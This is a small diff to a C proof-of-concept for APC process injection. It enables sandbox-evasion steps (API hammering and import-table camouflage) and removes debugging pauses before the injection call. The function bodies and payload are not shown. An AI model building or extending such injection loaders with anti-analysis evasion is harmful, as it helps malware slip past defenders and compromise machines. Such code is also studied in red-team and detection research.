@@ -5,7 +5,8 @@
 // POC for testing APC injection
 int main()
 {
-	// ApiHammering(2000);
+	ApiHammering(2000);
+	IatCamouflage();
 
 	unsigned char* pPayload = NULL;
 	
@@ -25,14 +26,10 @@ int main()
 	printf("\n");
 
 	getchar();
-
-	getchar();
 	if (InitiateInjection(pPayload,sSize))
 	{
 		return -1;
 	}
-
-	getchar();
 
 _Cleanup:
 	return 0;
